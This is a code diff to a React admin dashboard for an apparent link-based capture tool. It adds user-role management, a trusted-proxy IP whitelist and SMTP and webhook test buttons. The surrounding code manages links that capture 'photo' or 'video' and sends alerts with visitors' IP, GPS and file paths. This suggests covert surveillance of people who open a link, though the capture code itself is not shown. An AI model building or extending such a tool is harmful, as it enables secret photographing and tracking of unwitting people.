@@ -6,7 +6,7 @@ import { Input } from "@/components/ui/input";
 import { Textarea } from "@/components/ui/textarea";
 import { Card, CardHeader, CardTitle, CardContent, CardDescription } from "@/components/ui/card";
 import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
-import { Shield, Link as LinkIcon, Camera, Trash2, ExternalLink, Copy, Check, LogIn, RefreshCw, ChevronLeft, ChevronRight, Globe, HardDrive, LayoutDashboard, Database, Activity, Download, MapPin, Mail, Languages, FileText } from "lucide-react";
+import { Shield, Link as LinkIcon, Camera, Trash2, ExternalLink, Copy, Check, LogIn, RefreshCw, ChevronLeft, ChevronRight, Globe, HardDrive, LayoutDashboard, Database, Activity, Download, MapPin, Mail, Languages, FileText, Users } from "lucide-react";
 import { toast } from "sonner";
 import { startLogin } from "@/const";
 import { AreaChart, Area, XAxis, YAxis, Tooltip, ResponsiveContainer, CartesianGrid } from "recharts";
@@ -20,7 +20,7 @@ export default function Home() {
   const [lang, setLang] = useState<Language>("zh");
   const t = translations[lang];
 
-  const [activeTab, setActiveTab] = useState<"dashboard" | "links" | "gallery" | "smtp" | "audit">("dashboard");
+  const [activeTab, setActiveTab] = useState<"dashboard" | "links" | "gallery" | "smtp" | "audit" | "users">("dashboard");
   const [linkId, setLinkId] = useState("");
   const [redirectUrl, setRedirectUrl] = useState("https://example.com");
   const [captureType, setCaptureType] = useState<"photo" | "video">("photo");
@@ -40,6 +40,7 @@ export default function Home() {
   const [webhookType, setWebhookType] = useState<"dingtalk" | "wechat" | "telegram">("dingtalk");
   const [webhookTemplate, setWebhookTemplate] = useState("");
   const [webhookAlertLevel, setWebhookAlertLevel] = useState<"all" | "high">("all");
+  const [trustedProxyIps, setTrustedProxyIps] = useState("");
 
   // 筛选与分页
   const [selectedFilterId, setSelectedFilterId] = useState<string>("all");
@@ -76,6 +77,9 @@ export default function Home() {
   const auditLogsQuery = trpc.status.auditLogs.useQuery(undefined, {
     enabled: isAuthenticated && user?.role === "admin",
   });
+  const usersQuery = trpc.status.users.list.useQuery(undefined, {
+    enabled: isAuthenticated && user?.role === "admin",
+  });
 
   useEffect(() => {
     if (!smtpStatusQuery.data || smtpHost) return;
@@ -89,7 +93,29 @@ export default function Home() {
     setWebhookType((smtpStatusQuery.data.webhookType as "dingtalk" | "wechat" | "telegram") || "dingtalk");
     setWebhookTemplate(smtpStatusQuery.data.webhookTemplate || "");
     setWebhookAlertLevel((smtpStatusQuery.data.webhookAlertLevel as "all" | "high") || "all");
+    setTrustedProxyIps(smtpStatusQuery.data.trustedProxyIps || "");
   }, [smtpStatusQuery.data, smtpHost]);
+  const testSmtpMutation = trpc.status.testSmtp.useMutation({
+    onSuccess: (result) => {
+      toast[result.success ? "success" : "error"](result.success ? "SMTP 连接测试通过。" : `SMTP 测试失败：${result.error || "未知错误"}`);
+      smtpStatusQuery.refetch();
+    },
+    onError: (err) => toast.error(err.message || "SMTP 测试失败。"),
+  });
+  const testWebhookMutation = trpc.status.testWebhook.useMutation({
+    onSuccess: (result) => {
+      toast[result.sent ? "success" : "error"](result.sent ? "Webhook 测试通知已发送。" : `Webhook 未发送：${result.result}`);
+      smtpStatusQuery.refetch();
+    },
+    onError: (err) => toast.error(err.message || "Webhook 测试失败。"),
+  });
+  const updateRoleMutation = trpc.status.users.updateRole.useMutation({
+    onSuccess: () => {
+      toast.success("用户角色已更新。");
+      usersQuery.refetch();
+    },
+    onError: (err) => toast.error(err.message || "角色更新失败。"),
+  });
   const saveSmtpMutation = trpc.status.saveSmtp.useMutation({
     onSuccess: () => {
       toast.success(t.smtpSuccess);
@@ -213,6 +239,7 @@ export default function Home() {
       webhookType,
       webhookTemplate,
       webhookAlertLevel,
+      trustedProxyIps,
     });
   };
 
@@ -221,6 +248,8 @@ export default function Home() {
   const paginatedCaptures = allCaptures.slice((currentPage - 1) * pageSize, currentPage * pageSize);
   const totalLinks = linksQuery.data?.length || 0;
   const isSmtpConfigured = smtpStatusQuery.data?.configured ?? false;
+  const smtpTestResult = smtpStatusQuery.data?.smtpTestResult || "not_tested";
+  const webhookLastResult = smtpStatusQuery.data?.webhookLastResult || "not_sent";
 
   const getChartData = () => {
     const countsMap: Record<string, number> = {};
@@ -373,16 +402,26 @@ export default function Home() {
             <Mail className="w-4 h-4" /> {t.smtpConfig}
           </button>
           {user?.role === "admin" && (
-            <button
-              onClick={() => setActiveTab("audit")}
-              className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-medium transition-all whitespace-nowrap ${
-                activeTab === "audit"
-                  ? "bg-indigo-600 text-white shadow-md shadow-indigo-600/30"
-                  : "text-slate-400 hover:text-slate-200 hover:bg-slate-800/50"
-              }`}
-            >
-              <FileText className="w-4 h-4" /> 审计日志
-            </button>
+            <>
+              <button
+                onClick={() => setActiveTab("audit")}
+                className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-medium transition-all whitespace-nowrap ${
+                  activeTab === "audit" ? "bg-indigo-600 text-white shadow-md shadow-indigo-600/30" : "text-slate-400 hover:text-slate-200 hover:bg-slate-800/50"
+                }`}
+              >
+                <FileText className="w-4 h-4" />
+                审计日志
+              </button>
+              <button
+                onClick={() => setActiveTab("users")}
+                className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-medium transition-all whitespace-nowrap ${
+                  activeTab === "users" ? "bg-indigo-600 text-white shadow-md shadow-indigo-600/30" : "text-slate-400 hover:text-slate-200 hover:bg-slate-800/50"
+                }`}
+              >
+                <Users className="w-4 h-4" />
+                用户权限
+              </button>
+            </>
           )}
         </div>
       </nav>
@@ -850,6 +889,30 @@ export default function Home() {
           </div>
         )}
 
+        {activeTab === "users" && user?.role === "admin" && (
+          <div className="space-y-6 animate-in fade-in duration-300">
+            <Card className="bg-slate-900/60 border-slate-800 backdrop-blur-md rounded-2xl shadow-xl">
+              <CardHeader className="flex flex-row items-center justify-between">
+                <div>
+                  <CardTitle className="text-lg text-white flex items-center gap-2"><Users className="w-5 h-5 text-indigo-400" /> 用户权限管理</CardTitle>
+                  <CardDescription className="text-slate-400 text-xs">仅管理员可修改角色；角色变更会写入审计日志，当前登录管理员不能自我降级。</CardDescription>
+                </div>
+                <Button variant="outline" size="sm" onClick={() => usersQuery.refetch()} className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-xl"><RefreshCw className="w-4 h-4 mr-1.5" />刷新</Button>
+              </CardHeader>
+              <CardContent>
+                {usersQuery.isLoading ? <div className="text-center py-12 text-slate-500">加载中…</div> : (usersQuery.data || []).length === 0 ? <div className="text-center py-12 text-slate-500">暂无用户。</div> : (
+                  <div className="overflow-x-auto rounded-xl border border-slate-800">
+                    <Table>
+                      <TableHeader className="bg-slate-950/80"><TableRow className="border-slate-800"><TableHead className="text-slate-400">用户</TableHead><TableHead className="text-slate-400">登录标识</TableHead><TableHead className="text-slate-400">当前角色</TableHead><TableHead className="text-slate-400">最近登录</TableHead><TableHead className="text-slate-400">修改角色</TableHead></TableRow></TableHeader>
+                      <TableBody>{(usersQuery.data || []).map((member) => <TableRow key={member.id} className="border-slate-800"><TableCell className="text-slate-200 text-sm">{member.name || "未命名用户"}<div className="text-[11px] text-slate-500">{member.email || "无邮箱"}</div></TableCell><TableCell className="text-slate-400 text-xs font-mono">{member.openId}</TableCell><TableCell className="text-indigo-300 text-xs font-mono">{member.role}</TableCell><TableCell className="text-slate-400 text-xs whitespace-nowrap">{member.lastSignedIn ? new Date(member.lastSignedIn).toLocaleString() : "-"}</TableCell><TableCell><select aria-label={`修改 ${member.name || member.openId} 角色`} value={member.role} disabled={updateRoleMutation.isPending || member.id === user.id} onChange={(e) => updateRoleMutation.mutate({ userId: member.id, role: e.target.value as "admin" | "auditor" | "operator" | "viewer" | "user" })} className="bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-xs text-white"><option value="user">普通用户</option><option value="viewer">只读用户</option><option value="operator">运营员</option><option value="auditor">审计员</option><option value="admin">管理员</option></select></TableCell></TableRow>)}</TableBody>
+                    </Table>
+                  </div>
+                )}
+              </CardContent>
+            </Card>
+          </div>
+        )}
+
         {activeTab === "smtp" && (
           <div className="space-y-6 animate-in fade-in duration-300 max-w-2xl mx-auto w-full">
             <Card className="bg-slate-900/60 border-slate-800 backdrop-blur-md rounded-2xl shadow-xl">
@@ -962,6 +1025,16 @@ export default function Home() {
                     />
                   </div>
                   <div className="space-y-2">
+                    <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider">可信代理 IP 白名单</label>
+                    <Input
+                      placeholder="例如：10.0.0.2, 192.168.1.10, 203.0.113.20"
+                      value={trustedProxyIps}
+                      onChange={(e) => setTrustedProxyIps(e.target.value)}
+                      className="bg-slate-950 border-slate-800 text-white rounded-xl h-11 font-mono text-xs"
+                    />
+                    <p className="text-[11px] text-slate-500">仅白名单代理可以提供 X-Forwarded-For、X-Real-IP 或 Cloudflare IP；每个地址用逗号分隔。内网代理默认受信任。</p>
+                  </div>
+                  <div className="space-y-2">
                     <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider">自定义 Webhook 消息模板</label>
                     <Textarea
                       placeholder="支持变量: {linkId}, {ip}, {gps}, {resolution}, {filePath}, {createdAt}, {collectionMode}, {riskFlags}"
@@ -969,6 +1042,15 @@ export default function Home() {
                       onChange={(e) => setWebhookTemplate(e.target.value)}
                       className="bg-slate-950 border-slate-800 text-white rounded-xl min-h-[100px] font-mono text-xs"
                     />
+                  </div>
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 rounded-xl border border-slate-800 bg-slate-950/60 p-3 text-xs">
+                    <div className="space-y-1"><span className="text-slate-500">SMTP 最近状态</span><p className={smtpTestResult === "passed" || smtpTestResult === "sent" ? "text-emerald-400" : smtpTestResult === "failed" ? "text-red-400" : "text-slate-300"}>{smtpTestResult} {smtpStatusQuery.data?.smtpTestedAt ? `· ${new Date(smtpStatusQuery.data.smtpTestedAt).toLocaleString()}` : ""}</p></div>
+                    <div className="space-y-1"><span className="text-slate-500">Webhook 最近状态</span><p className={webhookLastResult === "sent" ? "text-emerald-400" : webhookLastResult === "failed" ? "text-red-400" : "text-slate-300"}>{webhookLastResult} {smtpStatusQuery.data?.webhookLastSentAt ? `· ${new Date(smtpStatusQuery.data.webhookLastSentAt).toLocaleString()}` : ""}</p></div>
+                    {smtpStatusQuery.data?.webhookLastError && <p className="sm:col-span-2 text-red-300 break-words">错误：{smtpStatusQuery.data.webhookLastError}</p>}
+                  </div>
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                    <Button type="button" variant="outline" disabled={testSmtpMutation.isPending || !smtpHost || !smtpUser || !smtpPass} onClick={() => testSmtpMutation.mutate({ host: smtpHost, port: Number(smtpPort) || 465, user: smtpUser, pass: smtpPass })} className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-xl py-5">{testSmtpMutation.isPending ? "测试中…" : "测试 SMTP 连接"}</Button>
+                    <Button type="button" variant="outline" disabled={testWebhookMutation.isPending || !webhookUrl} onClick={() => testWebhookMutation.mutate()} className="border-slate-700 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-xl py-5">{testWebhookMutation.isPending ? "发送中…" : "发送 Webhook 测试"}</Button>
                   </div>
                   <Button
                     type="submit"
